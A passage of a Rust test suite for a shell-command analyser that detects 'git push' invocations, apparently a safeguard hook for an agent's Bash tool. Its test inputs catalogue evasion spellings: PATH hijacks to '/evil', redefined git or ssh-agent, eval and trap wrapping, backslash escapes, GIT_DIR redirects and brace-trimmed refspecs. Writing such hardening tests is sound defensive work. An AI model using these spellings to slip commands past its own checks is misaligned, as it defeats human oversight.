            assert!(!invocation.repository_unresolved, "{command}");
        }
    }

    #[test]
    fn a_toplevel_cd_is_not_trusted_when_git_may_be_something_else() {
        // Review of #1132: a quoted literal, or a command that can redefine
        // `git`, falls back to an unreadable target.
        for command in [
            "cd '$(git rev-parse --show-toplevel)' && git push origin main",
            "git(){ command git -C /x \"$@\"; }; cd \"$(git rev-parse --show-toplevel)\" && git push",
            "function git { :; }; cd \"$(git rev-parse --show-toplevel)\" && git push",
            "export PATH=/evil:$PATH && cd \"$(git rev-parse --show-toplevel)\" && git push",
            "declare -x PATH; cd \"$(git rev-parse --show-toplevel)\" && git push",
            ". ./env.sh; cd \"$(git rev-parse --show-toplevel)\" && git push",
            "hash -p /evil/git git; git -C \"$(git rev-parse --show-toplevel)\" push",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.directory_unverified, "{command}");
        }
    }

    #[test]
    fn directory_targets_the_walk_cannot_read_are_unverified() {
        // Review of #1132: `-C` and `env -C` follow the `cd` rules.
        for (command, want_dir, unverified) in [
            ("git -C \"$D\" push origin main", "/repo", true),
            ("D=/other; git -C $D push origin main", "/repo", true),
            ("env -C \"$D\" git push origin main", "/repo", true),
            ("env -C /other git push origin main", "/other", false),
            ("env --chdir=/other git push origin main", "/other", false),
            ("env --chdir /other git push origin main", "/other", false),
            ("env -iC /other git push origin main", "/other", false),
            ("env -i -C sub git push origin main", "/repo/sub", false),
            (
                "env -C /other sh -c 'git push origin main'",
                "/other",
                false,
            ),
            // A literal absolute `cd` ends an earlier directory doubt.
            (
                "cd \"$HOME\" && cd /abs/own && git push origin main",
                "/abs/own",
                false,
            ),
            // So does a Windows drive path, in either separator.
            (
                "cd \"$HOME\" && cd C:\\abs\\own && git push origin main",
                "C:\\abs\\own",
                false,
            ),
            (
                "cd \"$HOME\" && cd D:/abs/own && git push origin main",
                "D:/abs/own",
                false,
            ),
            (
                "cd \"$HOME\" && cd rel && git push origin main",
                "/repo/rel",
                true,
            ),
        ] {
            let invocation = only(command, "/repo");
            assert_eq!(invocation.work_dir, want_dir, "{command}");
            assert_eq!(invocation.directory_unverified, unverified, "{command}");
            assert!(!invocation.repository_unresolved, "{command}");
        }
        // An absolute `cd` does not clear a which-repository doubt.
        assert!(
            only("eval 'cd /x'; cd /abs && git push origin main", "/repo").repository_unresolved
        );
    }

    #[test]
    fn an_ssh_agent_eval_moves_nothing() {
        // cadence-hooks#1095 ruling: ssh-agent's output only sets variables.
        for command in [
            "eval \"$(ssh-agent -s)\"; git push origin main",
            "eval $(ssh-agent) && git push origin main",
            "eval `ssh-agent -s` && git push origin main",
            // Redirections are not operands (review of #1132).
            "eval \"$(ssh-agent -s)\" > /dev/null && git push origin main",
            "eval \"$(ssh-agent -s)\" 2>/dev/null; git push origin main",
            // ssh-agent's value-taking options, glued or separate.
            "eval \"$(ssh-agent -s -t 3600)\"; git push origin main",
            "eval \"$(ssh-agent -a /tmp/agent.sock -t1h -E sha256 -P /usr/lib/x)\"; git push",
            "eval \"$(ssh-agent -O no-restrict-websafe)\"; git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(!invocation.unresolved, "{command}");
        }
        // Anything else under `eval` still refuses.
        for command in [
            "eval \"$(cat env.sh)\"; git push origin main",
            "eval \"$(ssh-agent -s)\" cd /other; git push origin main",
            "eval \"$(ssh-agent -s; cd /other)\"; git push origin main",
            // A trailing word is a command ssh-agent runs; its output is eval'd.
            "eval \"$(ssh-agent -s mycmd)\"; git push origin main",
            "eval \"$(ssh-agent -t)\"; git push origin main",
            "eval \"$(ssh-agent -a $(pwd))\"; git push origin main",
            // A single-quoted operand is text, not a substitution.
            "eval '$(ssh-agent -s)'; git push origin main",
            // The name may not be ssh-agent any more.
            "ssh-agent(){ echo 'cd /x'; }; eval \"$(ssh-agent -s)\"; git push",
            "shopt -s expand_aliases; alias ssh-agent=f; eval \"$(ssh-agent -s)\"; git push",
            "PATH=/evil:$PATH; eval \"$(ssh-agent -s)\"; git push origin main",
            "source ./env.sh; eval \"$(ssh-agent -s)\"; git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.repository_unresolved, "{command}");
        }
    }

    #[test]
    fn builtin_prefixed_cd_moves_the_work_dir() {
        // `builtin cd /usr` prints `/usr` under bash, zsh and sh alike — every
        // shell agrees, so the move is knowable.
        let invocation = only("builtin cd /other && git push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/other");
        assert!(!invocation.unresolved);
    }

    #[test]
    fn command_prefixed_cd_is_shell_dependent_and_refuses() {
        // Measured: `command cd /usr` prints `/usr` under bash and sh but
        // `/tmp` under zsh, which forces external lookup — and the Bash tool on
        // this estate is zsh. The walk cannot know which shell runs, and an
        // earlier cut picked bash's answer and stated it with `unresolved:
        // false`.
        for command in [
            "command cd /other && git push origin main",
            "command -p cd /other && git push origin main",
            "command command cd /other && git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.unresolved, "for {command}");
        }
    }

    #[test]
    fn an_inner_backslash_in_the_verb_still_resolves_the_push() {
        // Measured: `g\it --version` prints `git version 2.55.0` under bash and
        // zsh. `command_word` stripped only a LEADING backslash after a
        // basename that splits on `\`, so `g\it` resolved to `it`, the segment
        // was dropped, and an empty invocation list is the strongest allow
        // shape there is.
        assert_eq!(sources("g\\it push origin main", "/repo"), ["main"]);
        assert_eq!(sources("gi\\t push origin main", "/repo"), ["main"]);
        // The subcommand takes the same escape (`git pu\sh` runs a push).
        assert_eq!(sources("git pu\\sh origin main", "/repo"), ["main"]);
    }

    #[test]
    fn a_backslash_bearing_directory_verb_refuses() {
        // `tokenize` throws quoting away, so `'c\d' /x` and `c\d /x` arrive as
        // the SAME token — and the shells disagree about them: measured, `\cd
        // /usr` moves under bash, zsh and sh while `'\cd' /usr` moves under
        // none of them (the quotes make it a literal command name).
        //
        // For push detection, unescaping is safe — it only widens what is seen.
        // For a directory verb it is not: a wrong move is a wrong repository. So
        // a candidate that merely COULD unescape to a directory verb refuses.
        for command in [
            "'c\\d' /other && git push origin main",
            "c\\d /other && git push origin main",
            "\\cd /other && git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.unresolved, "should refuse: {command}");
        }
        // `cd\ /other` is ONE word, a command named `cd /other` that the shell
        // cannot find, so it never moves: the push is judged where it stands.
        // The tokenizer used to split it into two words, which is the only
        // reason this row once had to refuse (PR #1140 review).
        let invocation = only("cd\\ /other && git push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/repo");
        assert!(!invocation.unresolved);
    }

    #[test]
    fn a_backslash_bearing_prefix_refuses() {
        // The escape can sit in the PREFIX rather than the verb, and every one
        // of these moves the shell (measured under bash, zsh and sh; the
        // `\command` rows move under bash and sh only). Comparing the raw
        // prefix token made the whole segment invisible instead: the loop broke
        // on it, the prefix became the candidate, and `directory_verb` returned
        // None — so the walk kept a stale directory with `unresolved: false`,
        // which is worse than the over-refusal it replaced.
        for command in [
            "\\builtin cd /other && git push origin main",
            "buil\\tin cd /other && git push origin main",
            "b\\uiltin cd /other && git push origin main",
            "\\command cd /other && git push origin main",
            "comm\\and cd /other && git push origin main",
            "\\command -p cd /other && git push origin main",
            "\\builtin \\cd /other && git push origin main",
            "\\builtin popd && git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.unresolved, "should refuse: {command}");
        }
    }

    #[test]
    fn a_flagged_builtin_refuses() {
        // `builtin` takes NO options in bash, zsh or sh — measured, a flag word
        // makes it fail and the shell stays put. The peel shared one flag-skip
        // loop with `command`, so it skipped the flag, found `cd`, and reported
        // the move: a wrong repository with `unresolved: false`. Same trade
        // `resolve_directory_verb` already makes for `pushd` — refuse on ANY
        // flag rather than on a list of them.
        //
        // `builtin -- cd` is the second, independent half: bash and sh move,
        // zsh does not, and the Bash tool on this estate is zsh.
        for command in [
            "builtin -p cd /other ; git push origin main",
            "builtin -x cd /other ; git push origin main",
            "builtin --nope cd /other ; git push origin main",
            "builtin -p -q -z cd /other ; git push origin main",
            "builtin -p pushd /other ; git push origin main",
            "builtin -- cd /other ; git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.unresolved, "should refuse: {command}");
        }
        // Controls: an unflagged `builtin` still moves, and a flagged `command`
        // still refuses through its own arm.
        let moved = only("builtin cd /other && git push origin main", "/repo");
        assert_eq!(moved.work_dir, "/other");
        assert!(!moved.unresolved);
        assert!(only("command -v cd /other ; git push origin main", "/repo").unresolved);
    }

    #[test]
    fn an_escaped_push_option_is_read_like_its_unescaped_control() {
        // Argv proof, all three shells:
        // `printf "[%s]" --t\ags --mirr\or -\-all` yields
        // `[--tags][--mirror][--all]`. The walk compared the raw word, so an
        // escaped `--all` read as an unrecognised option: `origin` became the
        // repository, no refspec was collected, and the implicit HEAD shipped
        // with `unresolved: false` while git published every branch.
        for command in [
            "git push --all origin",
            "git push --a\\ll origin",
            "git push -\\-all origin",
            "git push --al\\l origin",
            "git push --mirr\\or origin",
            "git push origin --a\\ll",
        ] {
            assert!(only(command, "/repo").all_or_mirror, "for {command}");
        }
        for command in [
            "git push --tags origin",
            "git push --t\\ags origin",
            "git push --ta\\gs origin main",
        ] {
            assert!(only(command, "/repo").tags, "for {command}");
        }
        // `--delete` widens the same way: an escaped spelling still deletes.
        assert!(only("git push --dele\\te origin topic", "/repo").refspecs[0].is_delete);
        // `dry_run` is the ONE arm where firing more often licenses an allow,
        // so it stays matched on the raw word and under-matches an escape.
        assert!(!only("git push --dry-\\run origin main", "/repo").dry_run);
        assert!(only("git push --dry-run origin main", "/repo").dry_run);
    }

    #[test]
    fn an_escaped_prefix_flag_refuses() {
        // `builtin \-- cd /other` and `command \-p cd /other` move bash and sh
        // (zsh stays) — the same three-way split F5 and F11 refuse. Both flag
        // tests read the raw token, so the escaped word failed them, became the
        // candidate, was not a directory verb, and the walk returned `None`:
        // a STALE directory with `unresolved: false`, the F9 mechanism one
        // token to the right.
        //
        // The last three rows are over-refusals — the shell stays put for
        // those — and that is the safe side, since the token cannot say whether
        // it was quoted.
        for command in [
            "builtin \\-- cd /other ; git push origin main",
            "command \\-p cd /other ; git push origin main",
            "builtin -- cd /other ; git push origin main",
            "command -p cd /other ; git push origin main",
            "builtin \\-p cd /other ; git push origin main",
            "command \\-v cd /other ; git push origin main",
            "builtin \\--nope cd /other ; git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.unresolved, "should refuse: {command}");
            assert_eq!(invocation.work_dir, "/repo", "no stale move: {command}");
        }
    }

    #[test]
    fn an_escaped_transparent_prefix_still_sees_the_push() {
        // `exec`, `command`, `builtin`, `time` and `nohup` are TRANSPARENT-only
        // — unlike `env`/`nice`, they have no second path through
        // `peel_command_runners` — so an escaped spelling made the whole
        // segment invisible and the push was absent from the results entirely.
        // Every row runs its argument in bash, zsh and sh.
        for command in [
            "exec git push origin main",
            "\\exec git push origin main",
            "\\command git push origin main",
            "\\builtin git push origin main",
            "\\time git push origin main",
            "ti\\me git push origin main",
            "\\nohup git push origin main",
            "time git push origin main",
            "nohup git push origin main",
        ] {
            assert_eq!(sources(command, "/repo"), ["main"], "for {command}");
        }
    }

    #[test]
    fn an_escaped_env_operand_redirect_is_seen() {
        // Two positions, opposite answers, same word. As an `env` OPERAND the
        // shell strips the backslash before `env` sees it, so `env GIT_\DIR=/x`
        // really sets GIT_DIR — measured, `env GIT_\DIR=/nope git rev-parse
        // --git-dir` reports `not a git repository: '/nope'` in all three
        // shells. As a bare shell PREFIX no shell honours it at all.
        assert!(only("env GIT_DIR=/x git push origin main", "/repo").unresolved);
        assert!(only("env GIT_\\DIR=/x git push origin main", "/repo").unresolved);
        assert!(only("env -i GIT_DIR=/x git push origin main", "/repo").unresolved);
        // Controls: the bare prefix spelling is honoured by no shell, so seeing
        // no push is the RIGHT answer and must stay that way.
        assert!(push_invocations("GIT_\\DIR=/x git push origin main", "/repo").is_empty());
        assert!(push_invocations("GIT_CONFIG_\\COUNT=1 git push origin main", "/repo").is_empty());
    }

    #[test]
    fn a_flagged_transparent_prefix_reports_an_unresolved_push() {
        // No escape involved at all. `skip_transparent_prefixes` refuses to skip
        // a prefix whose next token is a flag — deliberately, so a prefix's own
        // option grammar is never parsed — and `command`/`exec`/`time`/`nohup`
        // have no `COMMAND_RUNNERS` second path the way `env`/`nice` do. The
        // segment therefore yielded NOTHING, which is the strongest allow shape
        // there is. Every row below runs under bash, zsh and sh (measured).
        for command in [
            "command -p git push origin main",
            "exec -a name git push origin main",
            "exec -c git push origin main",
            "exec -l git push origin main",
            "time -p git push origin main",
            // Over-refused on purpose: `builtin -p git push` fails in all three
            // shells, so nothing is published. An unresolvable push a caller can
            // explain beats an absent one it cannot see.
            "builtin -p git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.unresolved, "{command:?} must refuse, not vanish");
            assert_eq!(invocation.work_dir, "/repo", "{command:?}");
            assert!(invocation.refspecs.is_empty(), "{command:?}");
        }
        // `eval` joins the same fallback: it is in neither TRANSPARENT nor
        // COMMAND_RUNNERS, so the whole segment was invisible. `child_scripts`
        // now also surfaces the `eval`'d script (cadence-hooks#886), so the push
        // is described too — alongside the fallback's refusal, never instead of
        // it.
        let found = push_invocations("eval git push origin main", "/repo");
        assert!(found.iter().any(|push| push.unresolved), "{found:?}");
        assert!(
            found.iter().any(|push| push
                .refspecs
                .iter()
                .any(|r| r.source.as_deref() == Some("main"))),
            "{found:?}"
        );
        // Controls: `env`/`nice` are ALSO command runners, whose peel has a real
        // flag grammar, so these resolve fully and must keep doing so. A `--`
        // after any transparent prefix is that prefix's end of options, and the
        // shared skip reads it so (cadence-hooks#888): the push behind it
        // resolves rather than falling back to a refusal.
        for command in [
            "env -i git push origin main",
            "nice -n 5 git push origin main",
            "nohup -- git push origin main",
            "/usr/bin/nohup -- git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(!invocation.unresolved, "{command:?}");
            assert_eq!(
                invocation
                    .refspecs
                    .iter()
                    .filter_map(|r| r.source.clone())
                    .collect::<Vec<_>>(),
                ["main"],
                "{command:?}"
            );
        }
        // Control: a prefix with no push behind it stays absent, so the fallback
        // cannot invent an invocation out of any transparent prefix at all.
        assert!(push_invocations("command -p git status", "/repo").is_empty());
        assert!(push_invocations("exec -a name ls", "/repo").is_empty());
    }

    #[test]
    fn a_path_spelled_transparent_prefix_still_refuses() {
        // The fallback asked `names_transparent_prefix`, which unescapes and
        // folds but does NOT basename — while every sibling asking the same
        // question basenames (`peel_command_runners` and the fallback this
        // mirrors both go through `command_word`). `nohup` and `time` are real
        // binaries in /usr/bin, so this is not a theoretical spelling: each row below runs
        // under bash, zsh and sh (measured) and yielded nothing at all.
        for command in [
            "/usr/bin/time -p git push origin main",
            "command.exe -p git push origin main",
        ] {
            assert!(
                only(command, "/repo").unresolved,
                "{command:?} must refuse, not vanish"
            );
        }
        // The shared skip now basenames too (cadence-hooks#888), so an unflagged
        // or `--`-terminated path-spelled prefix no longer needs the fallback:
        // the push behind it resolves fully.
        for command in [
            "/usr/bin/nohup -- git push origin main",
            "/usr/bin/nohup git push origin main",
            "/usr/bin/time git push origin main",
            "./nohup -- git push origin main",
        ] {
            assert_eq!(sources(command, "/repo"), ["main"], "{command:?}");
            assert!(!only(command, "/repo").unresolved, "{command:?}");
        }
        // Controls: `env`/`nice` already survived a path because they are also
        // command runners, whose peel basenames. They must keep resolving fully.
        for command in [
            "/usr/bin/env -i git push origin main",
            "/usr/bin/nice -n 5 git push origin main",
        ] {
            assert_eq!(sources(command, "/repo"), ["main"], "{command:?}");
        }
        // Control: the bare spelling resolves the same way.
        assert_eq!(sources("nohup -- git push origin main", "/repo"), ["main"]);
    }

    #[test]
    fn a_git_global_between_the_verb_and_push_still_refuses() {
        // The fallback was an ADJACENT-pair scan, so any global between `git`
        // and `push` restored the silent allow — and `-C /other` does not merely
        // hide the push, it redirects it to another repository. Every row is an
        // ordinary spelling with no escape anywhere.
        for command in [
            "command -p git -C /other push origin main",
            "exec -a x git -C /other push origin main",
            "time -p git -C /other push origin main",
            "command -p git --git-dir=/x push origin main",
            "command -p git -c foo=bar push origin main",
        ] {
            assert!(
                only(command, "/repo").unresolved,
                "{command:?} must refuse, not vanish"
            );
        }
        // `eval` keeps the fallback's refusal, and `child_scripts` now also
        // describes the push it runs (cadence-hooks#886) — two records, one of
        // them unresolved, so a caller still refuses.
        let found = push_invocations("eval git -C /other push origin main", "/repo");
        assert!(found.iter().any(|push| push.unresolved), "{found:?}");
        assert!(
            found.iter().any(|push| push.work_dir == "/other"),
            "{found:?}"
        );
        // `nohup --` is skipped by the shared prefix walk (cadence-hooks#888),
        // so the structured read sees the `-C` and resolves the push THERE.
        let invocation = only("nohup -- git -C /other push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/other");
        // Controls: the shapes that already worked must keep working.
        for command in [
            "command -p git push origin main",
            "command -p git pu\\sh origin main",
            "command -p \\git push origin main",
            "command -p /usr/bin/git push origin main",
        ] {
            assert!(only(command, "/repo").unresolved, "{command:?}");
        }
        // N26 is NOT closed by this fix, and the round's premise that it would be
        // does not hold. `command -p grep git push file` still refuses, because
        // `git push` really is adjacent in argument position: the structured read
        // finds `git` at index 3 and `git_globals` hands back `push` as its
        // subcommand, which is the correct reading of those two words in
        // isolation. Distinguishing them would require knowing that `grep` — not
        // `git` — is what the prefix runs, and that is exactly the per-prefix
        // flag grammar F16 declined to parse. Kept as a pinned over-refusal
        // rather than silently drifting.
        assert!(only("command -p grep git push file", "/repo").unresolved);
    }

    #[test]
    fn a_quoted_redirect_shaped_refspec_is_not_stripped() {
        // The fail-open the redirect strip introduced. `tokenize` performs quote
        // REMOVAL, so `'>leak'` and `>leak` arrive byte-identical, and a strip
        // judging the text alone discards the ambiguous case silently — the one
        // direction this module's doctrine forbids. `git check-ref-format
        // refs/heads/'>b'` answers OK, so these are legal refs.
        //
        // Every row must refuse. `is_safe_ref` rejects the `>` either way, so a
        // surviving token means `OutboundRange::Unresolved`, which a caller
        // cannot read as empty.
        for command in [
            "git push origin '>leak'",
            "git push origin '<leak'",
            "git push origin '2>x'",
            "git push origin '>' leak",
            "git push origin '>leak' main",
            "git push origin main '>leak'",
            "git push --delete origin '>leak'",
        ] {
            let invocation = only(command, "/repo");
            // Asserted on `raw`, not `source`: a `--delete` refspec has no
            // source by construction, so a source-only assertion would have
            // reported a kept operand as lost.
            assert!(
                invocation
                    .refspecs
                    .iter()
                    .any(|refspec| refspec.raw.contains('>') || refspec.raw.contains('<')),
                "{command:?} must keep the quoted operand, got {:?}",
                invocation.refspecs
            );
        }
        // The quoted operand in REPOSITORY position must not be read as a
        // redirect either — the refspec that follows is the real one.
        assert_eq!(sources("git push '>origin' main", "/repo"), ["main"]);
        // Control: the backslash spelling already refused, and must keep doing so
        // — the token keeps its backslash byte, so the strip never saw it.
        assert!(
            sources("git push origin \\>leak main", "/repo")
                .iter()
                .any(|s| s.contains('>'))
        );
        // Control: an ordinary UNQUOTED redirect is still stripped.
        assert_eq!(
            sources("git push origin main > /dev/null", "/repo"),
            ["main"]
        );
        assert_eq!(
            sources("git push origin main >/dev/null", "/repo"),
            ["main"]
        );
        // Control: a `>` inside a ref, not leading it, was never redirect-shaped.
        assert_eq!(
            sources("git push origin refs/heads/a>b", "/repo"),
            ["refs/heads/a>b"]
        );
    }

    #[test]
    fn a_redirect_with_a_quoted_target_is_still_a_redirect() {
        // Whole-token quote marking read `>"$LOG"` as "quoted", so the redirect
        // survived as a refspec, `is_safe_ref` rejected it, and the commonest
        // script spelling was refused. The operator is unquoted; only its TARGET
        // is. The mark this decision needs is about the operator prefix.
        for command in [
            "git push origin main >\"$LOG\"",
            "git push origin main >>\"$LOG\"",
            "git push origin main 2>\"$ERR\"",
            "git push origin main >\"$HOME/push.log\"",
            "git push origin main 2>\"/dev/null\"",
            "git push origin main >\"log\" 2>&1",
            "git push origin main >'/tmp/my log'",
            "git push --dry-run origin main >\"$LOG\"",
            // Controls: the standalone-operator form was never affected.
            "git push origin main > \"$LOG\"",
            "git push origin main > '/tmp/my log'",
        ] {
            assert_eq!(sources(command, "/repo"), ["main"], "{command:?}");
        }
        // `--all` rows are in scope too. With the redirect stripped there is no
        // NAMED refspec left, so the implicit-`HEAD` arm fires — which is right:
        // `all_or_mirror` is what tells a caller the range is wider than HEAD.
        let all = only("git push --all origin >'log'", "/repo");
        assert!(all.all_or_mirror);
        assert!(all.refspecs.iter().all(|refspec| refspec.implicit));
        assert_eq!(sources("git push --all origin >'log'", "/repo"), ["HEAD"]);
    }

    #[test]
    fn a_quoted_redirect_operator_keeps_its_operand() {
        // The other side of the same mark. When the OPERATOR itself was quoted
        // the word is an operand, not a redirection — including the spellings
        // where the quote sits mid-operator or emits no bytes at all.
        for command in [
            "git push origin '>leak'",
            "git push origin '>'log",
            "git push origin ''>log",
            "git push origin 2'>'x",
            "git push origin '2'>x",
        ] {
            let invocation = only(command, "/repo");
            assert!(
                invocation
                    .refspecs
                    .iter()
                    .any(|refspec| refspec.raw.contains('>')),
                "{command:?} must keep the operand, got {:?}",
                invocation.refspecs
            );
        }
    }

    #[test]
    fn a_push_inside_eval_or_trap_is_found_and_a_trap_s_is_unresolved() {
        // cadence-hooks#886: `eval` hands its operands back to the parser, and
        // the walk saw zero invocations. Found now, in the directory in effect
        // at the `eval` — which is where bash runs it.
        for command in [
            "eval 'git push origin main'",
            "eval \"git push origin main\"",
            "GIT_DIR=/x eval 'git push origin main'",
        ] {
            let found = push_invocations(command, "/repo");
            assert!(
                found.iter().any(|push| push
                    .refspecs
                    .iter()
                    .any(|r| r.source.as_deref() == Some("main"))),
                "{command:?} must be found, got {found:?}"
            );
        }
        // cadence-hooks#1059: a trap action runs when the signal fires, in the
        // directory the parent has reached BY THEN — so the walk cannot vouch
        // for where it runs and must refuse rather than report `/repo`.
        for command in [
            "trap 'git push origin main' EXIT",
            "trap 'git push origin main' EXIT; cd /other",
        ] {
            let found = push_invocations(command, "/repo");
            assert!(!found.is_empty(), "{command:?} must not vanish");
            assert!(
                found.iter().all(|push| push.unresolved),
                "{command:?} must refuse, got {found:?}"
            );
        }
        // Control: a trap that installs nothing contributes nothing.
        assert!(push_invocations("trap - EXIT", "/repo").is_empty());
    }

    #[test]
    fn an_unbalanced_group_closer_refuses_rather_than_reporting_a_trimmed_word() {
        // `strip_group_wrappers` trims a trailing `}`/`)` unconditionally, so a
        // segment whose last token legitimately ends in one loses those bytes
        // before tokenization. `}` is an ordinary character there — measured,
        // `bash -c 'echo push origin main}'` prints it — and
        // `git check-ref-format refs/heads/'main}'` answers OK.
        //
        // The refspec face reports a DIFFERENT ref than the command publishes;
        // the directory face reports a different repository, both with
        // `unresolved: false`. Both are wrong answers, which this module exists
        // to prevent. bash and sh rows — zsh parse-errors on the source.
        for command in [
            "git push origin secret}",
            "git push origin secret}}",
            "git push --delete origin secret}",
            "git push origin main secret}",
            "git -C /other push origin secret}",
            "cd /other} && git push origin main",
        ] {
            assert!(
                only(command, "/repo").unresolved,
                "{command:?} must refuse, not answer"
            );
        }
        // A `}` glued to a word is the tell, wherever the opener landed. These
        // four kept their wrong answer under an opener/closer COUNT, because a
        // matched opener paid for a closer that was a real word byte.
        for command in [
            "{ git push origin secret}; }",
            "{ cd /other}; git push origin main; }",
            "( git push origin secret} )",
            "(cd /other} && git push origin main)",
        ] {
            assert!(
                only(command, "/repo").unresolved,
                "{command:?} must refuse, not answer"
            );
        }
        // **Controls the count broke.** `split_segments_with_ops` cuts on `&&`,
        // `;` and `|`, so a wrapper's opener and closer land in DIFFERENT
        // segments and a per-segment count sees an unmatched closer in ordinary,
        // correct commands.
        //
        // **Asserted on RESOLVE, not on `is_empty()`.** The weaker form was green
        // at the head that carried the defect: the count never suppressed these
        // invocations, it set `unresolved` on them — so a presence check could
        // not have gone red for the bug it was written to pin.
        for command in [
            "(cd /other && git push origin main)",
            "(cd /other; git push origin main)",
            "$(git push origin main)",
            "f() ( git push origin main )",
            "(git push origin main)",
            "{ git push origin main; }",
            "git push origin main;",
            "git push origin main",
            // An unquoted `${VAR}` ends a segment with a `}` glued to a letter —
            // the predicate's exact shape — so the scan has to step over a brace
            // that closes a `${`. `echo $HOME` versus `echo ${HOME}` is the whole
            // finding: one character, and every later push in the scope refused.
            "echo ${HOME}; git push origin main",
            "mkdir -p ${OUT}; git push origin main",
            "echo $HOME; git push origin main",
            "export PATH=${PATH}:/x && git push origin main",
            "awk '{print $1}'; git push origin main",
            "echo ${A} ${B}; git push origin main",
            "echo ${DIR}/sub && git push origin main",
            // NOT a row for this predicate: `cd ${DIR}/sub && git push` refuses,
            // but for the older and correct reason that a `$` in a `cd` target
            // is unknowable — nothing to do with a trailing brace.
        ] {
            assert!(
                !only(command, "/repo").unresolved,
                "{command:?} must RESOLVE, not merely be seen"
            );
        }
        // Refuses, and rightly: bash rejects `{ …}` outright, so nothing runs.
        assert!(only("( { git push origin main} )", "/repo").unresolved);
        // **A quoted `${` is a literal, not an opener.** Without the quote check
        // the expansion carve-out is a disarm: a single-quoted `'${'` anywhere
        // earlier in the segment makes the trailing `}` look like an expansion's
        // own, and both wrong-answer faces reopen with `unresolved: false`.
        for command in [
            "git push origin --push-option='${' secret}",
            "X='${' git push origin secret}",
            "X='${' cd /other} && git push origin main",
            "git push origin --push-option=\"${\" secret}",
        ] {
            assert!(
                only(command, "/repo").unresolved,
                "{command:?} must refuse — the quoted `${{` opens nothing"
            );
        }
        // **An expansion as the LAST token keeps its brace.** The shared
        // `strip_group_wrappers` trims a `}` only where it stands as its own word
        // (cadence-hooks#889), so the refspec is recorded whole. It still refuses
        // — the `$` fails `is_safe_ref`, so the range is `Unresolved`.
        assert_eq!(sources("git push origin ${BRANCH}", "/repo"), ["${BRANCH}"]);
        assert!(!is_safe_ref("${BRANCH}"));
        // Quoting was always the shape that survived, and still is.
        assert_eq!(
            sources("git push origin \"${BRANCH}\"", "/repo"),
            ["${BRANCH}"]
        );
        assert_eq!(
            sources("(cd /other && git push origin main)", "/repo"),
            ["main"]
        );
        assert_eq!(sources("(git push origin main)", "/repo"), ["main"]);
        assert_eq!(sources("{ git push origin main; }", "/repo"), ["main"]);
        assert_eq!(sources("git push origin main;", "/repo"), ["main"]);
        assert_eq!(sources("git push origin main", "/repo"), ["main"]);
    }

    #[test]
    fn a_redirection_before_the_subcommand_still_sees_the_push() {
        // A redirection is legal anywhere in a simple command, and the strip ran
        // AFTER the verb, globals and subcommand reads — so each of those was
        // handed a redirect token where it expected a word and returned None.
        // Every row runs under bash, zsh and sh (measured: a redirect between
        // the command word and its arguments is transparent to git).
        for command in [
            "git >log push origin main",
            "git 2>/dev/null push origin main",
            "git >/dev/null push origin secret-branch",
            ">log git push origin main",
        ] {
            assert!(
                !push_invocations(command, "/repo").is_empty(),
                "{command:?} must not vanish"
            );
        }
        assert_eq!(sources("git >log push origin main", "/repo"), ["main"]);
        assert_eq!(
            sources("git 2>/dev/null push origin main", "/repo"),
            ["main"]
        );
        assert!(only("git >log push --all", "/repo").all_or_mirror);
        // The prefix-wrapped spellings reach the fallback, which strips too.
        assert!(only("command -p git >log push origin main", "/repo").unresolved);
        assert!(only("time -p git 2>/dev/null push origin main", "/repo").unresolved);
        // `nohup --` is skipped by the shared prefix walk (cadence-hooks#888),
        // so the structured read strips the redirect itself.
        assert_eq!(
            sources("nohup -- git 2>/dev/null push origin main", "/repo"),
            ["main"]
        );
        // Control: the trailing spelling, unchanged.
        assert_eq!(sources("git push origin main >log", "/repo"), ["main"]);
    }

    #[test]
    fn a_redirection_is_not_a_refspec() {
        // `strip_redirections` existed and was called at exactly one site — the
        // directory-verb operand read — while `scan_push_words` was handed the
        // words with the redirect tokens still in them. The first FALSE-REFUSAL
        // class this module has carried, on the most ordinary spelling there is:
        // `>` reaches `is_safe_ref`, which rejects it, and the range comes back
        // Unresolved for a push that is entirely routine.
        for command in [
            "git push origin main > /dev/null",
            "git push origin main >/dev/null",
            "git push origin main 2>&1",
            "git push origin main >log 2>&1",
            "git push origin main > out.txt",
            "git push origin main 2>/dev/null | tee log",
        ] {
            assert_eq!(sources(command, "/repo"), ["main"], "{command:?}");
        }
        // A redirect BEFORE the operands must not be read as the repository.
        assert_eq!(sources("git push > log origin main", "/repo"), ["main"]);
        // Control.
        assert_eq!(sources("git push origin main", "/repo"), ["main"]);
    }

    #[test]
    fn an_escaped_runner_flag_still_sees_the_push() {
        // `skip_runner_flags` and `shell_c_argument_tokens` both compared raw
        // tokens, so an escaped flag was read as the command word and the peel
        // stopped there. Every row runs under bash, zsh and sh (measured); the
        // `env \-i GIT_DIR=/x` row is F14's own scenario one backslash to the
        // left, landing on the NO-PUSH-SEEN side F14 was raised to close.
        assert_eq!(
            sources("sh \\-c 'git push origin main'", "/repo"),
            ["main"],
            "an escaped -c must still surface the child script"
        );
        for command in [
            "nice \\-n 5 git push origin main",
            "sudo \\-u me git push origin main",
            "xargs \\-I{} git push origin main",
            "env \\-i git push origin main",
        ] {
            assert_eq!(sources(command, "/repo"), ["main"], "{command:?}");
        }
        // The redirect is still read through the escaped flag.
        assert!(only("env \\-i GIT_DIR=/x git push origin main", "/repo").unresolved);
        assert!(only("env \\-i GIT_\\DIR=/x git push origin main", "/repo").unresolved);
        // Control: the unescaped spelling, unchanged.
        assert_eq!(sources("sh -c 'git push origin main'", "/repo"), ["main"]);
    }

    #[test]
    fn an_escaped_cd_dash_refuses_rather_than_inventing_a_directory() {
        // `resolve_directory_verb` skipped flags on the raw token, so `\-` was
        // not recognised as the bare `-` meaning $OLDPWD; it fell through to
        // `resolve_cd_target`, which joined it into `/repo/\-`. It failed closed
        // downstream, but an invented directory is not an answer.
        assert!(only("cd \\- ; git push origin main", "/repo").unresolved);
